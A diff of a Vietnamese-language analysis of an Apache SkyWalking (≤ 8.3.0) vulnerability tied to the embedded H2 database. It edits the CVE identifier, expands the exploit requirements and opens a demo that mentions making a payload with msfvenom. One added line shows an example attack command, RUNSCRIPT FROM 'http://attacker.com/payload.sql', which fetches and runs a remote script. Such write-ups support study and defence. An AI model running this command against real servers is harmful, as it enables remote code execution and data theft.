@@ -1,4 +1,4 @@
-# Phân tích lỗ hổng CVE-2020-9483 trong Apache SkyWalking ≤ 8.3.0
+# Phân tích lỗ hổng CVE-2020-13945 trong Apache SkyWalking ≤ 8.3.0
 
 **1. Thông tin chung**
 
@@ -8,7 +8,13 @@ Mức độ: High
 
 Ảnh hưởng: Apache SkyWalking từ 6.x đến 8.3.0
 
-Điều kiện: Ứng dụng sử dụng H2 Database (cấu hình mặc định)
+Điều kiện bắt buộc để bị khai thác lỗ hổng (Exploit Requirements):
+
+•   Sử dụng H2 Database ở chế độ mặc định (embedded)	SkyWalking tích hợp sẵn H2 để lưu trữ metadata nếu bạn không cấu hình dùng MySQL, PostgreSQL,...
+
+•   Không cấu hình xác thực hoặc chặn quyền truy cập console	Mặc định, H2 không yêu cầu xác thực mạnh nếu không tự cấu hình.
+
+•   Máy chủ có thể kết nối outbound đến attacker (ví dụ để tải script .sql từ internet)	Để thực thi payload từ xa qua lệnh RUNSCRIPT FROM 'http://attacker.com/payload.sql'
 
 **2. Mô tả lỗ hổng**
 
@@ -49,7 +55,9 @@ Trong một số trường hợp, kết hợp với các chức năng mở rộn
 
 Dữ liệu quan trọng có thể bị truy xuất, xóa, hoặc chỉnh sửa trái phép.
 
-Demo:
+Demo: 
+
+
 
 Tạo payload trên msfvenom
 
